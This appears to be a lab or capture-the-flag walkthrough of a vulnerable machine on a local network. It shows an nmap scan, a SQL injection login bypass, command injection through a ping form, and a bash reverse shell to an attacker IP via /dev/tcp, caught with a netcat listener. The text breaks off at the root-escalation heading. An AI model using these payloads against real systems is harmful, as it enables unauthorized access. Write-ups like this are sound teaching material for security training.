## 1\. Enumeration

#### 1.1 TCP Ports enumeration

  

    
    
    root@kali:~# nmap 192.168.1.67 -sV

Hmm, some interesting services we see running on the machine. Most of these
are pretty old. I did a quick search for existing exploits and didn't find
any. It's still very possible that other vulnerabilities exist, yet I decided
to check the web server running first.  
  
Note: I didn't do a full TCP scan as it was taking way too long. Running it in
the background after the initial scan is might be useful.  
  

## 2\. Web server

#### 2.1 Login form

**Remote System Administration Login**  
---  
Username |  
Password |  
  
Hitting http://192.168.1.67 shows us a login form, possibly vulnerable to SQL
injection. I tried the vanilla **admin' or 1=1 #** and it worked!  
  
Why did it work? Possibly because the query is in this form:  
  

    
    
    SELECT * from users where username="$_REQUEST["username"]" and password="$_REQUEST["password"]"  
    

  
After submitting **admin" or 1=1 #**, it's evaluated to:  
  

    
    
    SELECT * from users where username="admin" or 1=1 # _" and password="$_REQUEST["password"]"_  
    

  
which logs us in as admin.  
  

#### 2.2 Admin interface

####  

####  **Welcome to the Basic Administrative Web Console**  
---  
Ping a Machine on the Network:  |  
  
  
This looks very vulnerable to an RCE (Remote Code Injection) attack. Let's try
appending commands to it.  
  

  * **Input:**  127.0.0.1 ** **  
**Output:**   
  

    
         127.0.0.1

  * **Input:**  127.0.0.1; whoami** **  
**Output:**   
  

    
        127.0.0.1; whoami

    **apache**  
    

  
**whoami **command** **returned apache! We're able to execute arbitrary commands. Let's get a shell by starting a listener on attacking machine.  
  
  

    
    
    root@kali:~# nc -nvlp 443  
    listening on [any] 443 ...  
    

  
Then getting a reverse shell connected to it.  
  
**Input:** 127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.1.69/443 0&gt;&amp;1  
**Output on attacking machine:**  
  

    
    
    root@kali:~# nc -nvlp 443  
    listening on [any] 443 ...  
    connect to [192.168.1.69] from (UNKNOWN) [192.168.1.67] 32769  
    bash: no job control in this shell  
    bash-3.00$   
    

  
Awesome! We got a shell as apache user.  
  

## 3\. Getting root
